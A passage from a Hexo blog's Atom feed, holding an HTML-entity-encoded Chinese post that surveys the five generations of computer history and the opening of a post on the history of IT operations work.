      <category term="SQL Server" scheme="https://marnm.github.io/tags/SQL-Server/"/>
    
  </entry>
  
  <entry>
    <title>计算机概述</title>
    <link href="https://marnm.github.io//posts/217dc297/"/>
    <id>https://marnm.github.io//posts/217dc297/</id>
    <published>2020-10-24T13:39:04.000Z</published>
    <updated>2022-05-27T01:37:50.116Z</updated>
    
    <content type="html"><![CDATA[<h2 id="&#x8BA1;&#x7B97;&#x673A;&#x6982;&#x8FF0;"><a href="#&#x8BA1;&#x7B97;&#x673A;&#x6982;&#x8FF0;" class="headerlink" title="&#x8BA1;&#x7B97;&#x673A;&#x6982;&#x8FF0;"></a>&#x8BA1;&#x7B97;&#x673A;&#x6982;&#x8FF0;</h2><blockquote><p>&#x4ECA;&#x5929;1024&#xFF0C;&#x6D45;&#x8C08;&#x4EE5;&#x4E0B;&#x8BA1;&#x7B97;&#x673A;&#x5386;&#x53F2;&#x2026;.</p></blockquote><h3 id="&#x8BA1;&#x7B97;&#x673A;&#x53D1;&#x5C55;&#x7684;&#x5386;&#x53F2;"><a href="#&#x8BA1;&#x7B97;&#x673A;&#x53D1;&#x5C55;&#x7684;&#x5386;&#x53F2;" class="headerlink" title="&#x8BA1;&#x7B97;&#x673A;&#x53D1;&#x5C55;&#x7684;&#x5386;&#x53F2;"></a>&#x8BA1;&#x7B97;&#x673A;&#x53D1;&#x5C55;&#x7684;&#x5386;&#x53F2;</h3><p>&#x81EA;&#x53E4;&#x4EE5;&#x6765;&#x4EBA;&#x7C7B;&#x5C31;&#x5728;&#x4E0D;&#x65AD;&#x5730;&#x53D1;&#x660E;&#x548C;&#x6539;&#x8FDB;&#x8BA1;&#x7B97;&#x5DE5;&#x5177;&#xFF0C;&#x4ECE;&#x7ED3;&#x7EF3;&#x8BA1;&#x6570;&#x5230;&#x7B97;&#x76D8;&#xFF0C;&#x8BA1;&#x7B97;&#x5C3A;&#xFF0C;&#x624B;&#x6447;&#x8BA1;&#x7B97;&#x673A;&#xFF0C;&#x76F4;&#x5230;1946&#x5E74;&#x7B2C;&#x4E00;&#x53F0;&#x7535;&#x5B50;&#x8BA1;&#x7B97;&#x673A;&#x8BDE;&#x751F;&#xFF0C;&#x867D;&#x7136;&#x7535;&#x5B50;&#x8BA1;&#x7B97;&#x673A;&#x81F3;&#x4ECA;&#x867D;&#x7136;&#x53EA;&#x6709;&#x77ED;&#x77ED;&#x7684;&#x534A;&#x4E2A;&#x591A;&#x4E16;&#x7EAA;&#xFF0C;&#x4F46;&#x53D6;&#x5F97;&#x4E86;&#x60CA;&#x4EBA;&#x7684;&#x53D1;&#x5C55;&#x5417;&#xFF0C;&#x5DF2;&#x7ECF;&#x7ECF;&#x5386;&#x4E86;&#x4E94;&#x4EE3;&#x7684;&#x53D8;&#x9769;&#x3002;&#x8BA1;&#x7B97;&#x673A;&#x7684;&#x53D1;&#x5C55;&#x548C;&#x7535;&#x5B50;&#x6280;&#x672F;&#x7684;&#x53D1;&#x5C55;&#x5BC6;&#x5207;&#x76F8;&#x5173;&#xFF0C;&#x6545;&#x6BCF;&#x6B21;&#x7535;&#x5B50;&#x6280;&#x672F;&#x6709;&#x7A81;&#x7834;&#x6027;&#x7684;&#x53D1;&#x5C55;&#xFF0C;&#x5C31;&#x4F1A;&#x5BFC;&#x81F4;&#x8BA1;&#x7B97;&#x673A;&#x7684;&#x4E00;&#x6B21;&#x91CD;&#x5927;&#x53D8;&#x9769;&#x3002;&#x6240;&#x4EE5;&#x8BA1;&#x7B97;&#x673A;&#x53D1;&#x5C55;&#x53F2;&#x4E2D;&#x7684; &#x2018;&#x2019;&#x4EE3;&#x2018;&#x2019; &#x901A;&#x5E38;&#x4EE5;&#x5176;&#x6240;&#x4F7F;&#x7528;&#x7684;&#x4E3B;&#x8981;&#x5668;&#x4EF6;&#x6765;&#x5212;&#x5206;&#x7684;&#xFF08;&#x7535;&#x5B50;&#x7BA1;&#xFF0C;&#x6676;&#x4F53;&#x7BA1;&#xFF0C;&#x96C6;&#x6210;&#x7535;&#x8DEF;&#xFF0C;&#x5927;&#x89C4;&#x6A21;&#x96C6;&#x6210;&#x7535;&#x8DEF;&#xFF0C;&#x8D85;&#x5927;&#x89C4;&#x6A21;&#x96C6;&#x6210;&#x7535;&#x8DEF;&#xFF09;&#x3002;&#x6B64;&#x5916;&#xFF0C;&#x5404;&#x4E2A;&#x9636;&#x6BB5;&#x6240;&#x914D;&#x7F6E;&#x7684;&#x8F6F;&#x4EF6;&#x548C;&#x4F7F;&#x7528;&#x65B9;&#x6CD5;&#x4E5F;&#x6709;&#x4E0D;&#x540C;&#x7684;&#x7279;&#x70B9;&#xFF0C;&#x6210;&#x4E3A;&#x5212;&#x5206; &#x201C;&#x4EE3;&#x201D; &#x7684;&#x6807;&#x5FD7;&#x4E4B;&#x4E00;&#x3002;<br><a id="more"></a><br><strong>1&#xFF1A;&#x7B2C;&#x4E00;&#x4EE3;&#x8BA1;&#x7B97;&#x673A;&#xFF08;1946-1957&#xFF09;</strong></p><p>&#x7535;&#x5B50;&#x8BA1;&#x7B97;&#x673A;&#x7684;&#x65E9;&#x671F;&#x7814;&#x7A76;&#x662F;&#x4ECE;20&#x4E16;&#x7EAA;30&#x5E74;&#x4EE3;&#x672B;&#x5F00;&#x59CB;&#x7684;&#x3002;&#x82F1;&#x56FD;&#x6570;&#x5B66;&#x5BB6; &#x827E;&#x4F26;&#x25AA;&#x56FE;&#x7075; &#x5728;&#x4E00;&#x7BC7;&#x8BBA;&#x6587;&#x4E2D;&#x63CF;&#x8FF0;&#x4E86;&#x901A;&#x7528;&#x8BA1;&#x7B97;&#x673A;&#x5E94;&#x5177;&#x6709;&#x7684;&#x5168;&#x90E8;&#x529F;&#x80FD;&#x53CA;&#x5176;&#x5C40;&#x9650;&#x6027;&#xFF0C;&#x8FD9;&#x79CD;&#x673A;&#x5668;&#x88AB;&#x6210;&#x4E3A;&#x56FE;&#x7075;&#x673A;&#x3002;&#xFF08;&#x4E16;&#x754C;&#x7B2C;&#x4E00;&#x53F0;&#x7535;&#x5B50;&#x8BA1;&#x7B97;&#x673A; ENIAC &#x5728;1946&#x5E74;&#x8BDE;&#x751F;&#x4E8E;&#x7F8E;&#x56FD;&#x5BBE;&#x5915;&#x6CD5;&#x5C3C;&#x4E9A;&#x5927;&#x5B66;&#xFF0C;&#x4F46;&#x5B66;&#x672F;&#x754C;&#x516C;&#x8BA4;&#x7535;&#x5B50;&#x8BA1;&#x7B97;&#x673A;&#x7684;&#x7406;&#x8BBA;&#x548C;&#x6A21;&#x578B;&#x662F;&#x7531;&#x82F1;&#x56FD;&#x6570;&#x5B66;&#x5BB6;&#x56FE;&#x7075;&#x5728;&#x6B64;10&#x5E74;&#x524D;&#x53D1;&#x8868;&#x7684;&#x4E00;&#x7BC7;&#x8BBA;&#x6587;&#x300A;&#x8BBA;&#x53EF;&#x8BA1;&#x7B97;&#x6570;&#x53CA;&#x5176;&#x5728;&#x5224;&#x5B9A;&#x95EE;&#x9898;&#x4E2D;&#x7684;&#x5E94;&#x7528;&#x300B;&#x4E2D;&#x5960;&#x5B9A;&#x7684;&#x57FA;&#x7840;&#xFF0C;&#x7F8E;&#x56FD;&#x8BA1;&#x7B97;&#x673A;&#x534F;&#x4F1A;&#x5728;1966&#x5E74;&#x7EAA;&#x5FF5;&#x7535;&#x5B50;&#x8BA1;&#x7B97;&#x673A;&#x8BDE;&#x751F;20&#x5468;&#x5E74;&#x65F6;&#xFF0C;&#x8BBE;&#x7ACB;&#x4E86;&#x8BA1;&#x7B97;&#x673A;&#x754C;&#x7684;&#x7B2C;&#x4E00;&#x4E2A;&#x5956;&#x9879; &#x201C;&#x56FE;&#x7075;&#x5956;&#x201D; &#xFF0C;&#x4EE5;&#x7EAA;&#x5FF5;&#x8FD9;&#x4F4D;&#x8BA1;&#x7B97;&#x673A;&#x79D1;&#x5B66;&#x7406;&#x8BBA;&#x7684;&#x5960;&#x57FA;&#x4EBA;&#xFF09;</p><p>1939&#x5E74;&#xFF0C;&#x7F8E;&#x56FD;&#x8863;&#x963F;&#x534E;&#x5DDE;&#x7ACB;&#x5927;&#x5B66;&#x7684;&#x7EA6;&#x7FF0;&#x25AA;&#x963F;&#x5854;&#x7EB3;&#x7D22;&#x592B;&#x6559;&#x6388;&#x548C;&#x4ED6;&#x7684;&#x7814;&#x7A76;&#x751F;&#x514B;&#x91CC;&#x798F;&#x5FB7;&#x25AA;&#x8D1D;&#x91CC;&#x4E00;&#x8D77;&#x5236;&#x4F5C;&#x4E86;&#x4E00;&#x53F0;&#x79F0;&#x4E3A;ABC&#x7684;&#x673A;&#x5668;&#xFF0C;&#x4F46;&#x5176;&#x4EC5;&#x80FD;&#x6C42;&#x89E3;&#x65B9;&#x7A0B;&#x5F0F;&#x7684;&#x4E13;&#x7528;&#x7535;&#x5B50;&#x8BA1;&#x7B97;&#x673A;&#xFF1B;</p><p>1944&#x5E74;&#xFF0C;&#x54C8;&#x4F5B;&#x5927;&#x5B66;&#x970D;&#x534E;&#x5FB7;&#x25AA;&#x827E;&#x80AF;&#x535A;&#x58EB;&#x548C;IBM&#x516C;&#x53F8;&#x7684;&#x5DE5;&#x7A0B;&#x5E08;&#x5C0F;&#x7EC4;&#x5408;&#x4F5C;&#xFF0C;&#x4EE5;100&#x4E07;&#x7F8E;&#x5143;&#x7814;&#x5236;&#x4E86;&#x4E00;&#x53F0;&#x79F0;&#x4E3A;Mark-I&#x7684;&#x8BA1;&#x7B97;&#x673A;&#xFF0C;&#x5B83;&#x4F53;&#x79EF;&#x5927;&#xFF0C;&#x8FD0;&#x7B97;&#x901F;&#x5EA6;&#x4E5F;&#x6162;&#xFF0C;&#x4E14;&#x4EC5;&#x4E00;&#x90E8;&#x5206;&#x662F;&#x7535;&#x5B50;&#x5F0F;&#x7684;&#xFF0C;&#x53E6;&#x4E00;&#x90E8;&#x5206;&#x662F;&#x673A;&#x68B0;&#x5F0F;&#x7684;&#xFF1B;</p><p>1946&#x5E74;&#xFF0C;&#x5BBE;&#x5915;&#x6CD5;&#x5C3C;&#x4E9A;&#x5927;&#x5B66;&#x7684;&#x7EA6;&#x7FF0;&#x25AA;&#x83AB;&#x514B;&#x83B1;&#x548C;&#x4ED6;&#x7684;&#x7814;&#x7A76;&#x751F;&#x666E;&#x96F7;&#x65AF;&#x5E15;&#x25AA;&#x57C3;&#x514B;&#x7279;&#x4E00;&#x8D77;&#x7814;&#x5236;&#x4E86;ENIAC&#xFF08;&#x7535;&#x5B50;&#x6570;&#x5B57;&#x79EF;&#x5206;&#x8BA1;&#x7B97;&#x673A;&#xFF09;&#x7684;&#x8BA1;&#x7B97;&#x673A;&#xFF0C;&#x662F;&#x516C;&#x8BA4;&#x7684;&#x4E16;&#x754C;&#x4E0A;&#x7B2C;&#x4E00;&#x53F0;&#x7535;&#x5B50;&#x8BA1;&#x7B97;&#x673A;&#xFF0C;&#x8BE5;&#x8BA1;&#x7B97;&#x673A;&#x91C7;&#x53D6;&#x4E86;&#x666E;&#x6797;&#x65AF;&#x987F;&#x5927;&#x5B66;&#x6570;&#x5B66;&#x6559;&#x6388; &#x51AF;&#x25AA;&#x4F0A;&#x8BFA;&#x66FC; &#x201C;&#x5B58;&#x50A8;&#x7A0B;&#x5E8F;&#x201D;&#x7684;&#x5EFA;&#x8BAE;&#xFF08;&#x628A;&#x8BA1;&#x7B97;&#x673A;&#x7A0B;&#x5E8F;&#x4E0E;&#x6570;&#x636E;&#x4E00;&#x8D77;&#x5B58;&#x50A8;&#x5728;&#x8BA1;&#x7B97;&#x673A;&#x4E2D;&#xFF0C;&#x4ECE;&#x800C;&#x53EF;&#x4EE5;&#x65B9;&#x4FBF;&#x5730;&#x8FD4;&#x56DE;&#x524D;&#x9762;&#x7684;&#x6307;&#x4EE4;&#x6216;&#x53CD;&#x590D;&#x6267;&#x884C;&#xFF0C;&#x89E3;&#x51B3;&#x4E86;ENIAC&#x5728;&#x64CD;&#x4F5C;&#x4E0A;&#x7684;&#x4E0D;&#x4FBF;&#xFF09;&#xFF1B;</p><p>&#x4E00;&#x4EE3;&#x8BA1;&#x7B97;&#x673A;&#x7684;&#x5171;&#x540C;&#x7279;&#x70B9;&#xFF1A;&#x903B;&#x8F91;&#x5668;&#x4EF6;&#x4F7F;&#x7528;&#x7535;&#x5B50;&#x7BA1;&#xFF1B;&#x7528;&#x7A7F;&#x5B54;&#x5361;&#x7247;&#x673A;&#x4F5C;&#x4E3A;&#x6570;&#x636E;&#x548C;&#x6307;&#x4EE4;&#x7684;&#x8F93;&#x5165;&#x8BBE;&#x5907;&#xFF1B;&#x7528;&#x78C1;&#x9F13;&#x6216;&#x78C1;&#x5E26;&#x4F5C;&#x4E3A;&#x5916;&#x5B58;&#x50A8;&#x5668;&#xFF1B;&#x4F7F;&#x7528;&#x673A;&#x5668;&#x8BED;&#x8A00;&#x7F16;&#x7A0B;&#x3002;</p><p><strong>2&#xFF1A;&#x7B2C;&#x4E8C;&#x4EE3;&#x8BA1;&#x7B97;&#x673A;&#xFF08;1958-1964&#xFF09;</strong></p><p>&#x5728;&#x4E8C;&#x4EE3;&#x8BA1;&#x7B97;&#x673A;&#x4E2D;&#x4F7F;&#x7528;&#x4E86;&#x6676;&#x4F53;&#x7BA1;&#xFF0C;&#x4E0E;&#x4E00;&#x4EE3;&#x673A;&#x76F8;&#x6BD4;&#xFF0C;&#x5B83;&#x4F53;&#x79EF;&#x5C0F;&#xFF0C;&#x901F;&#x5EA6;&#x5FEB;&#xFF0C;&#x80FD;&#x8017;&#x4F4E;&#xFF0C;&#x53EF;&#x9760;&#x6027;&#x9AD8;&#xFF1B;</p><p>&#x9AD8;&#x7EA7;&#x7A0B;&#x5E8F;&#x8BED;&#x8A00;&#x7684;&#x5E7F;&#x6CDB;&#x4F7F;&#x7528;&#xFF0C;&#x5C06;&#x8BA1;&#x7B97;&#x673A;&#x4ECE;&#x5C11;&#x6570;&#x4E13;&#x4E1A;&#x4EBA;&#x5458;&#x624B;&#x4E2D;&#x89E3;&#x653E;&#x51FA;&#x6765;&#xFF0C;&#x63A8;&#x8FDB;&#x4E86;&#x8BA1;&#x7B97;&#x673A;&#x7684;&#x666E;&#x53CA;&#x4E0E;&#x5E94;&#x7528;&#xFF1B;</p><p>&#x4E8C;&#x4EE3;&#x673A;&#x5668;&#x4E2D;&#x8F93;&#x5165;&#x3001;&#x8F93;&#x51FA;&#x8BBE;&#x5907;&#x901F;&#x5EA6;&#x5F88;&#x6162;&#xFF0C;&#x65E0;&#x6CD5;&#x4E0E;&#x4E3B;&#x673A;&#x7684;&#x8BA1;&#x7B97;&#x901F;&#x5EA6;&#x76F8;&#x5339;&#x914D;&#x3002;</p><p>&#x4E8C;&#x4EE3;&#x8BA1;&#x7B97;&#x673A;&#x7684;&#x7279;&#x70B9;&#x4E3A;&#xFF1A;&#x7528;&#x6676;&#x4F53;&#x7BA1;&#x4EE3;&#x66FF;&#x7535;&#x5B50;&#x7BA1;&#xFF1B;&#x5185;&#x5B58;&#x50A8;&#x5668;&#x91C7;&#x7528;&#x4E86;&#x78C1;&#x5FC3;&#x4F53;&#xFF1B;&#x5F15;&#x5165;&#x4E86;&#x53D8;&#x5740;&#x5BC4;&#x5B58;&#x5668;&#x548C;&#x6D6E;&#x70B9;&#x8FD0;&#x7B97;&#x786C;&#x4EF6;&#xFF1B;&#x5229;&#x7528; I/O &#x5904;&#x7406;&#x673A;&#x63D0;&#x9AD8;&#x4E86;&#x8F93;&#x5165;&#x8F93;&#x51FA;&#x80FD;&#x529B;&#xFF1B;&#x8F6F;&#x4EF6;&#x65B9;&#x9762;&#x914D;&#x7F6E;&#x4E86;&#x5B50;&#x7A0B;&#x5E8F;&#x5E93;&#x548C;&#x6279;&#x5904;&#x7406;&#x7BA1;&#x7406;&#x7A0B;&#x5E8F;&#x3002;</p><p><strong>3&#xFF1A;&#x7B2C;&#x4E09;&#x4EE3;&#x8BA1;&#x7B97;&#x673A;&#xFF08;1965-1971&#xFF09;</strong></p><p>1958&#x5E74;&#xFF0C;&#x7B2C;&#x4E00;&#x4E2A;&#x96C6;&#x6210;&#x7535;&#x8DEF;&#x95EE;&#x4E16;&#xFF08;&#x96C6;&#x6210;&#x7535;&#x8DEF;&#x5C31;&#x662F;&#x5C06;&#x5927;&#x91CF;&#x7684;&#x6676;&#x4F53;&#x7BA1;&#x548C;&#x7535;&#x5B50;&#x7EBF;&#x8DEF;&#x7EC4;&#x5408;&#x5728;&#x4E00;&#x5757;&#x7845;&#x6676;&#x7247;&#x4E0A;&#xFF0C;&#x6545;&#x79F0;&#x4E3A;&#x82AF;&#x7247;&#xFF09;&#x3002;</p><p>&#x4E09;&#x4EE3;&#x8BA1;&#x7B97;&#x7684;&#x7279;&#x70B9;&#xFF1A;&#x7528;&#x5C0F;&#x89C4;&#x6A21;&#xFF08;100&#x4EE5;&#x4E0B;&#x5143;&#x4EF6;&#xFF09;&#x6216;&#x4E2D;&#x89C4;&#x6A21;&#xFF08;100-1000&#x5143;&#x4EF6;&#xFF09;&#x7684;&#x96C6;&#x6210;&#x7535;&#x8DEF;&#x6765;&#x4EE3;&#x66FF;&#x6676;&#x4F53;&#x7BA1;&#x7B49;&#x5206;&#x7ACB;&#x5143;&#x4EF6;&#xFF1B;&#x7528;&#x534A;&#x5BFC;&#x4F53;&#x5B58;&#x50A8;&#x5668;&#x4EE3;&#x66FF;&#x78C1;&#x5FC3;&#x5B58;&#x50A8;&#x5668;&#xFF1B;&#x4F7F;&#x7528;&#x5FAE;&#x7A0B;&#x5E8F;&#x8BBE;&#x8BA1;&#x6280;&#x672F;&#x7B80;&#x5316;&#x5904;&#x7406;&#x673A;&#x7684;&#x7ED3;&#x6784;&#xFF1B;&#x5728;&#x8F6F;&#x4EF6;&#x65B9;&#x9762;&#x5E7F;&#x6CDB;&#x5F15;&#x5165;&#x591A;&#x9053;&#x7A0B;&#x5E8F;&#x3001;&#x5E76;&#x884C;&#x5904;&#x7406;&#x3001;&#x865A;&#x62DF;&#x5B58;&#x50A8;&#x7CFB;&#x7EDF;&#x4EE5;&#x53CA;&#x529F;&#x80FD;&#x5B8C;&#x5907;&#x7684;&#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;&#xFF0C;&#x63D0;&#x4F9B;&#x4E86;&#x5927;&#x91CF;&#x9762;&#x5411;&#x7528;&#x6237;&#x7684;&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#x3002;</p><p><strong>4&#xFF1A;&#x7B2C;&#x56DB;&#x4EE3;&#x8BA1;&#x7B97;&#x673A;&#xFF08;1972&#x5E74;&#x81F3;&#x4ECA;&#xFF09;</strong></p><p>&#x5FAE;&#x578B;&#x8BA1;&#x7B97;&#x673A;&#x7684;&#x8BDE;&#x751F;&#x662F;&#x8D85;&#x5927;&#x89C4;&#x6A21;&#x96C6;&#x6210;&#x7535;&#x8DEF;&#x5E94;&#x7528;&#x7684;&#x76F4;&#x63A5;&#x7ED3;&#x679C;&#xFF0C;1975&#x5E74;&#x7B2C;&#x4E00;&#x53F0;&#x5546;&#x4E1A;&#x5316;&#x7684;&#x5FAE;&#x578B;&#x8BA1;&#x7B97;&#x673A; MITS Altair &#x95EE;&#x4E16;&#xFF0C;&#x5B83;&#x4F7F;&#x7528;&#x4E86;Intel&#x516C;&#x53F8;&#x7684;8080&#x82AF;&#x7247;&#xFF1B;</p><p>&#x65F6;&#x81F3;&#x4ECA;&#x65E5;&#xFF0C;&#x5954;&#x817E;&#x7CFB;&#x5217;&#x5FAE;&#x5904;&#x7406;&#x5668;&#x5E94;&#x8FD0;&#x800C;&#x751F;&#xFF0C;&#x73B0;&#x5728;&#x5FAE;&#x578B;&#x8BA1;&#x7B97;&#x673A;&#x7684;&#x4F53;&#x79EF;&#x8D8A;&#x6765;&#x8D8A;&#x5C0F;&#x3001;&#x6027;&#x80FD;&#x8D8A;&#x6765;&#x5F3A;&#x3001;&#x53EF;&#x9760;&#x6027;&#x8D8A;&#x6765;&#x8D8A;&#x9AD8;&#x3001;&#x4EF7;&#x683C;&#x8D8A;&#x6765;&#x8D8A;&#x4F4E;&#x3001;&#x5E94;&#x7528;&#x8303;&#x56F4;&#x8D8A;&#x6765;&#x8D8A;&#x5E7F;&#xFF0C;&#x52A0;&#x4E0A;&#x5B8C;&#x5584;&#x7684;&#x7CFB;&#x7EDF;&#x8F6F;&#x4EF6;&#x3001;&#x4E30;&#x5BCC;&#x7684;&#x7CFB;&#x7EDF;&#x5F00;&#x53D1;&#x5DE5;&#x5177;&#x548C;&#x5546;&#x54C1;&#x5316;&#x7684;&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#x7684;&#x5927;&#x91CF;&#x6D8C;&#x73B0;&#xFF0C;&#x901A;&#x4FE1;&#x6280;&#x672F;&#x548C;&#x8BA1;&#x7B97;&#x673A;&#x7F51;&#x7EDC;&#x7684;&#x98DE;&#x901F;&#x53D1;&#x5C55;&#xFF0C;&#x4F7F;&#x5F97;&#x8BA1;&#x7B97;&#x673A;&#x8FDB;&#x5165;&#x4E86;&#x4E00;&#x4E2A;&#x5927;&#x53D1;&#x5C55;&#x7684;&#x9636;&#x6BB5;&#x3002;</p><p>&#x7B2C;&#x56DB;&#x4EE3;&#x8BA1;&#x7B97;&#x673A;&#x6700;&#x4E3A;&#x663E;&#x8457;&#x7684;&#x7279;&#x5F81;&#x5C31;&#x662F;&#x4F7F;&#x7528;&#x4E86;&#x5927;&#x89C4;&#x6A21;&#xFF08;1000-10000&#xFF09;&#x96C6;&#x6210;&#x7535;&#x8DEF;&#x548C;&#x8D85;&#x5927;&#x89C4;&#x6A21;&#x96C6;&#x6210;&#x7535;&#x8DEF;&#xFF08;10000&#x4EE5;&#x4E0A;&#xFF09;&#xFF1B;&#x4F7F;&#x7528;&#x5927;&#x5BB9;&#x91CF;&#x7684;&#x534A;&#x5BFC;&#x4F53;&#x4F5C;&#x4E3A;&#x5185;&#x5B58;&#x50A8;&#x5668;&#xFF1B;&#x5728;&#x4F53;&#x7CFB;&#x7ED3;&#x6784;&#x65B9;&#x9762;&#x8FDB;&#x4E00;&#x6B65;&#x53D1;&#x5C55;&#x4E86;&#x5E76;&#x884C;&#x5904;&#x7406;&#x3001;&#x591A;&#x673A;&#x7CFB;&#x7EDF;&#x3001;&#x5206;&#x5E03;&#x5F0F;&#x8BA1;&#x7B97;&#x673A;&#x7CFB;&#x7EDF;&#x548C;&#x8BA1;&#x7B97;&#x673A;&#x7F51;&#x7EDC;&#x7CFB;&#x7EDF;&#xFF1B;&#x5728;&#x8F6F;&#x4EF6;&#x65B9;&#x9762;&#x63A8;&#x51FA;&#x4E86;&#x6570;&#x636E;&#x5E93;&#x7CFB;&#x7EDF;&#x3001;&#x5206;&#x5E03;&#x5F0F;&#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;&#x4EE5;&#x53CA;&#x8F6F;&#x4EF6;&#x5DE5;&#x7A0B;&#x6807;&#x51C6;&#x7B49;&#x3002;</p><p><strong>5&#xFF1A;&#x7B2C;&#x4E94;&#x4EE3;&#x8BA1;&#x7B97;&#x673A;</strong></p><p>&#x4E94;&#x4EE3;&#x8BA1;&#x7B97;&#x673A;&#x5C1A;&#x5728;&#x7814;&#x5236;&#x4E4B;&#x4E2D;&#xFF0C;&#x7814;&#x7A76;&#x76EE;&#x6807;&#x662F;&#x8BD5;&#x56FE;&#x6253;&#x7834;&#x8BA1;&#x7B97;&#x673A;&#x73B0;&#x6709;&#x7684;&#x4F53;&#x7CFB;&#x7ED3;&#x6784;&#xFF0C;&#x4F7F;&#x5F97;&#x8BA1;&#x7B97;&#x673A;&#x80FD;&#x591F;&#x5177;&#x6709;&#x50CF;&#x4EBA;&#x90A3;&#x6837;&#x7684;&#x601D;&#x7EF4;&#x3001;&#x63A8;&#x7406;&#x548C;&#x5224;&#x65AD;&#x80FD;&#x529B;&#xFF08;&#x4EBA;&#x5DE5;&#x667A;&#x80FD;&#xFF09;&#x3002;</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;计算机概述&quot;&gt;&lt;a href=&quot;#计算机概述&quot; class=&quot;headerlink&quot; title=&quot;计算机概述&quot;&gt;&lt;/a&gt;计算机概述&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;今天1024，浅谈以下计算机历史….&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&quot;计算机发展的历史&quot;&gt;&lt;a href=&quot;#计算机发展的历史&quot; class=&quot;headerlink&quot; title=&quot;计算机发展的历史&quot;&gt;&lt;/a&gt;计算机发展的历史&lt;/h3&gt;&lt;p&gt;自古以来人类就在不断地发明和改进计算工具，从结绳计数到算盘，计算尺，手摇计算机，直到1946年第一台电子计算机诞生，虽然电子计算机至今虽然只有短短的半个多世纪，但取得了惊人的发展吗，已经经历了五代的变革。计算机的发展和电子技术的发展密切相关，故每次电子技术有突破性的发展，就会导致计算机的一次重大变革。所以计算机发展史中的 ‘’代‘’ 通常以其所使用的主要器件来划分的（电子管，晶体管，集成电路，大规模集成电路，超大规模集成电路）。此外，各个阶段所配置的软件和使用方法也有不同的特点，成为划分 “代” 的标志之一。&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>运维发展史</title>
    <link href="https://marnm.github.io//posts/dded0e80/"/>
    <id>https://marnm.github.io//posts/dded0e80/</id>
    <published>2020-09-26T12:35:45.000Z</published>
    <updated>2022-05-26T12:38:03.866Z</updated>
    
    <content type="html"><![CDATA[<h3 id="&#x8FD0;&#x7EF4;&#x5C97;&#x4F4D;&#x5386;&#x53F2;&#x60A0;&#x4E45;"><a href="#&#x8FD0;&#x7EF4;&#x5C97;&#x4F4D;&#x5386;&#x53F2;&#x60A0;&#x4E45;" class="headerlink" title="&#x8FD0;&#x7EF4;&#x5C97;&#x4F4D;&#x5386;&#x53F2;&#x60A0;&#x4E45;"></a>&#x8FD0;&#x7EF4;&#x5C97;&#x4F4D;&#x5386;&#x53F2;&#x60A0;&#x4E45;</h3><p>&#x63D0;&#x5230;&#x8FD0;&#x7EF4;&#x5F88;&#x591A;&#x4EBA;&#x53EF;&#x80FD;&#x60F3;&#x5230; IT&#x7CFB;&#x7EDF;&#x7684;&#x8FD0;&#x7EF4;&#xFF0C;&#x5176;&#x5B9E;&#x8FD0;&#x7EF4;&#x5C97;&#x4F4D;&#x4E0D;&#x4EC5;&#x4EC5;&#x6700;&#x8FD1;&#x51E0;&#x5341;&#x5E74;&#x624D;&#x6709;&#x7684;&#x5DE5;&#x4F5C;&#x5C97;&#x4F4D;&#xFF0C;&#x5927;&#x591A;&#x8FD0;&#x7EF4;&#x7684;&#x7406;&#x5FF5;&#x90FD;&#x6765;&#x81EA;&#x4EBA;&#x7C7B;&#x533B;&#x7597;&#x754C;&#xFF0C;&#x53EA;&#x4E0D;&#x8FC7;&#x533B;&#x751F;&#x662F;&#x5BF9;&#x4EBA;&#x4F53;&#x8FD9;&#x4E2A;&#x8D85;&#x7EA7;&#x590D;&#x6742;&#x7CFB;&#x7EDF;&#x505A;&#x8FD0;&#x7EF4;&#xFF0C;&#x8FD0;&#x7EF4;&#x5DE5;&#x7A0B;&#x5E08;&#x8FD0;&#x7EF4;&#x7684;&#x662F;IT&#x7CFB;&#x7EDF;&#x800C;&#x5DF2;&#x3002;&#x533B;&#x751F;&#x901A;&#x8FC7;&#x5BF9;&#x751F;&#x547D;&#x4EE5;&#x53CA;&#x751F;&#x6D3B;&#x7684;&#x5404;&#x79CD;&#x89C2;&#x5BDF;&#x4E0E;&#x8861;&#x91CF;&#x6765;&#x7EF4;&#x62A4;&#x751F;&#x547D;&#x7684;&#x6B63;&#x5E38;&#x72B6;&#x6001;&#x4E0E;&#x8FD0;&#x884C;&#xFF1B;&#x800C;&#x8FD0;&#x7EF4;&#x5DE5;&#x7A0B;&#x5E08;&#xFF1A;&#x901A;&#x8FC7;&#x5BF9;&#x7CFB;&#x7EDF;&#x8FD0;&#x884C;&#x7684;&#x5404;&#x79CD;&#x89C2;&#x5BDF;&#x4E0E;&#x8861;&#x91CF;&#x6765;&#x7EF4;&#x62A4;&#x7CFB;&#x7EDF;&#x7684;&#x6B63;&#x5E38;&#x72B6;&#x6001;&#x4E0E;&#x8FD0;&#x884C;&#xFF0C;&#x5982;&#x533B;&#x751F;&#x901A;&#x8FC7;&#x8840;&#x5E38;&#x89C4;&#x3001;&#x5C3F;&#x68C0;&#x7B49;&#x7B49;&#x89C2;&#x6D4B;&#x6307;&#x6807;&#x518D;&#x6839;&#x636E;&#x5386;&#x53F2;&#x7ECF;&#x9A8C;&#x6765;&#x8BC4;&#x4F30;&#x4E00;&#x4E2A;&#x4EBA;&#x7684;&#x8EAB;&#x4F53;&#x72B6;&#x6001;&#xFF0C;&#x8FD0;&#x7EF4;&#x4EBA;&#x5458;&#x901A;&#x8FC7;&#x7CFB;&#x7EDF;&#x6027;&#x80FD;&#x6307;&#x6807;KPI&#x53D8;&#x5316;&#x3001;&#x7CFB;&#x7EDF;&#x65E5;&#x5FD7;&#x7684;&#x6839;&#x636E;&#x7ECF;&#x9A8C;&#x627E;&#x56E0;&#x679C;&#x5173;&#x7CFB;&#x6765;&#x5B9A;&#x754C;&#x5B9A;&#x4F4D;&#x6545;&#x969C;&#xFF1B;&#x518D;&#x5982;&#x533B;&#x751F;&#x901A;&#x8FC7;X&#x5C04;&